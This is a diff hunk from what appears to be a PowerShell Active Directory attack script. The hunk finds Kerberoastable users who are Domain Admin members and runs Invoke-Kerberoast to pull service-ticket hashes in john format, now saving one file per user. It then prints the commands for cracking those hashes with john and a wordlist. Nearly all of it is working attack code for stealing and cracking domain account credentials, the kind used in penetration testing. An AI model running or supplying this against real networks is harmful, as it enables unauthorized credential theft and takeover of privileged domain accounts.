@@ -364,13 +364,16 @@ Write-Banner -Text "Kerberoastable users members of DA"
 Get-DomainUser -SPN -Domain $Domain -Server $PDC.IP4Address | ?{$_.memberof -match $DomainAdminsGroup.samaccountname -and $_.samaccountname -ne 'krbtgt'} | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\kerberoastable_da.csv" | ConvertFrom-Csv
 
 Write-Banner -Text "Kerberoasting all users"
-$TgsRepOutputFile = "$KerberoastDir\tgs_rep_$(New-Guid).txt"
 
 foreach($KerberoastableUser in $KerberoastableUsers){
-    Invoke-Kerberoast -Domain $Domain -Server $PDC.IP4Address -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File -Append "$TgsRepOutputFile"
+    Invoke-Kerberoast -Domain $Domain -Server $PDC.IP4Address -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File "$KerberoastDir\$($KerberoastableUser.samaccountname).txt"
 }
-Write-Output "[saving into ""$TgsRepOutputFile""]"
-Write-Host -ForegroundColor yellow "`r`n[!] Now run 'john --session=""Kerberoasting"" --wordlist=""$DicoPath"" $TgsRepOutputFile'"
+Write-Output "[saving tickets into ""$KerberoastDir\""]"
+Write-Host -ForegroundColor yellow "`r`n[!] Now run:"
+Write-Host -ForegroundColor yellow "    john --session=""Kerberoasting"" --wordlist=""$DicoPath"" $KerberoastDir\*"
+
+Write-Host -ForegroundColor yellow "`r`n[!] On linux, before john, run:"
+Write-Host -ForegroundColor yellow "    find /path/with/tickets -type f -name ""*.txt"" -print0 | xargs -0 dos2unix"
 
 #
 # Kerberos delegation - unconstrained
